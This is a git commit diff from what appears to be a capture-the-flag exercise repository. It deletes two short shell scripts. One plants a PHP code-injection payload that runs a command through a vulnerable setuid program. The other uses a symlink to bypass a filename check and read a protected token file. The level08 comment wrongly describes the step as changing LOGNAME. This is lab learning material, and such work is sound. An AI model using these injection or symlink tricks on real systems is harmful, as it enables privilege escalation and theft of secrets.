64e0ab3838062352201ec152543b2e1c930944b0
ADV <a.deverdilhac@gmail.com>
2020-10-08 16:21:47 +0200

    [ade-verd] merge resources

--- level06/Ressource_oo/script.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-# 1. Create the getflag file containing the string for regex
-echo '[x ${`getflag`}]' > /tmp/flag06
-
-# 2. Execute the PHP script, so it executes our injected getflag
-./level06 /tmp/flag06
--- level08/Ressource_oo/script.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-
-# 1. Change the LOGNAME env variable to getflag command
-ln -s ~/token /tmp/link
-
-# 2. Execute the C program
-./level08 /tmp/link
